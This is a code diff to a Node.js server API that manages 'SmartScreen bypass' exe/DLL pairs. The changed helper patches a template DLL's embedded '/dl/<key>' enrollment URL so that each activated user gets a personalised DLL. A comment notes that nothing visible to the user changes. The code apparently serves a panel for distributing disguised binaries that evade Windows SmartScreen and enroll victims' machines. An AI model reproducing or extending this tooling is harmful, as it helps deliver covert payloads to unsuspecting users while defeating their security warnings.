@@ -1126,7 +1126,7 @@ async function handleApi(req, res, urlPath) {
       const target = db.findAdminByEmail(b.username);
       if (!target) return json(res, 404, { error: 'account not found' });
       db.setSmartscreenAccess(target.id, !!b.enabled);
-      if (b.enabled) buildCustomDllsForAdmin(target.id, publicBase(req));
+      if (b.enabled) buildCustomDllsForAdmin(target.id);
       return json(res, 200, { ok: true, enabled: !!b.enabled });
     }
 
@@ -1161,53 +1161,55 @@ async function handleApi(req, res, urlPath) {
     // SmartScreen bypass file pairs. Owner manages; activated non-owners can read.
 
     // --- SmartScreen DLL patching helpers ---
-    // Template DLL must contain the ASCII string "HATCHURL" followed by at least
-    // one null byte (a 256-byte zero-padded slot). The active enrollment URL is
-    // written there at activation time so each user gets a personalised DLL.
-    const SS_MAGIC = Buffer.from('HATCHURL');
-    const SS_SLOT = 256;
-    function patchDllBuffer(templateBuf, url) {
+    // The DLL already has a /dl/<key> enrollment URL compiled into it.
+    // We scan the raw bytes for every occurrence of "/dl/" followed by exactly
+    // 20 base64url chars (the enrollment key) and replace those 20 chars with
+    // the target user's own key. Host stays the same; only the key changes.
+    // The saved file keeps the original filename — nothing visible to the user changes.
+    const DL_PREFIX = Buffer.from('/dl/');
+    const KEY_LEN = 20;
+    const KEY_RE = /^[A-Za-z0-9_-]{20}$/;
+    function patchDllBuffer(templateBuf, newKey) {
+      if (!KEY_RE.test(newKey)) return null;
       const buf = Buffer.from(templateBuf);
-      const urlBuf = Buffer.from(url);
-      if (urlBuf.length >= SS_SLOT) return null; // URL too long
-      for (let i = 0; i <= buf.length - SS_SLOT; i++) {
-        if (buf.slice(i, i + SS_MAGIC.length).equals(SS_MAGIC) && buf[i + SS_MAGIC.length] === 0) {
-          buf.fill(0, i, i + SS_SLOT);
-          urlBuf.copy(buf, i);
-          return buf;
+      const newKeyBuf = Buffer.from(newKey);
+      let patched = false;
+      for (let i = 0; i <= buf.length - DL_PREFIX.length - KEY_LEN; i++) {
+        if (buf.slice(i, i + DL_PREFIX.length).equals(DL_PREFIX)) {
+          const existing = buf.slice(i + DL_PREFIX.length, i + DL_PREFIX.length + KEY_LEN).toString('ascii');
+          if (KEY_RE.test(existing)) {
+            newKeyBuf.copy(buf, i + DL_PREFIX.length);
+            patched = true;
+          }
         }
       }
-      return null; // placeholder not in this DLL
+      return patched ? buf : null; // null = no /dl/<key> pattern found in binary
     }
-    function getEnrollUrl(adminId, base) {
+    function getEnrollKey(adminId) {
       const keys = db.keysForAdmin(adminId).filter((k) => !k.revoked);
-      if (!keys.length) return null;
-      return base + '/dl/' + keys[0].key;
+      return keys.length ? keys[0].key : null;
     }
-    function buildCustomDllsForEntry(ssEntry, base) {
+    function buildCustomDllsForEntry(ssEntry) {
       if (!ssEntry || !ssEntry.dllPath) return;
       let tpl;
       try { tpl = fs.readFileSync(ssEntry.dllPath); } catch { return; }
       const activated = db.listAdmins().filter((a) => a.role !== 'owner' && a.smartscreenEnabled);
-      let hasSlot = null;
       for (const a of activated) {
-        const enrollUrl = getEnrollUrl(a.id, base);
-        if (!enrollUrl) continue;
+        const newKey = getEnrollKey(a.id);
+        if (!newKey) continue;
         try {
-          const patched = patchDllBuffer(tpl, enrollUrl);
-          if (patched === null) { hasSlot = false; break; }
-          hasSlot = true;
+          const patched = patchDllBuffer(tpl, newKey);
+          if (!patched) break; // no /dl/<key> pattern in this DLL — skip all
           const customPath = path.join(db.DATA_DIR, 'smartscreen', ssEntry.adminId, ssEntry.id, 'custom-' + a.id + '.dll');
           fs.writeFileSync(customPath, patched);
         } catch (err) { console.error('[SS PATCH entry]', err.message); }
       }
-      if (hasSlot === false) console.warn('[SS PATCH] DLL has no HATCHURL placeholder — custom DLLs skipped for entry', ssEntry.id);
     }
-    function buildCustomDllsForAdmin(targetAdminId, base) {
+    function buildCustomDllsForAdmin(targetAdminId) {
       const ownerRow = db.listAdmins().find((a) => a.role === 'owner');
       if (!ownerRow) return;
-      const enrollUrl = getEnrollUrl(targetAdminId, base);
-      if (!enrollUrl) return;
+      const newKey = getEnrollKey(targetAdminId);
+      if (!newKey) return;
       const entries = db.listSmartscreen(ownerRow.id);
       for (const e of entries) {
         if (!e.complete) continue;
@@ -1215,8 +1217,8 @@ async function handleApi(req, res, urlPath) {
         if (!full || !full.dllPath) continue;
         try {
           let tpl; try { tpl = fs.readFileSync(full.dllPath); } catch { continue; }
-          const patched = patchDllBuffer(tpl, enrollUrl);
-          if (patched === null) continue;
+          const patched = patchDllBuffer(tpl, newKey);
+          if (!patched) continue;
           const customPath = path.join(db.DATA_DIR, 'smartscreen', ownerRow.id, e.id, 'custom-' + targetAdminId + '.dll');
           fs.writeFileSync(customPath, patched);
         } catch (err) { console.error('[SS PATCH admin]', err.message); }
@@ -1286,7 +1288,7 @@ async function handleApi(req, res, urlPath) {
       out.on('finish', () => {
         if (aborted) return;
         const entry = db.setSmartscreenDll(admin.id, id, filename, size, dest);
-        if (entry) buildCustomDllsForEntry(entry, publicBase(req));
+        if (entry) buildCustomDllsForEntry(entry);
         return json(res, 200, { ok: true, entry: entry ? { id: entry.id, name: entry.name, exeFilename: entry.exeFilename, dllFilename: entry.dllFilename } : null });
       });
       out.on('error', (e) => { try { fs.unlinkSync(dest); } catch {}; if (!aborted) json(res, 500, { error: e.message }); });
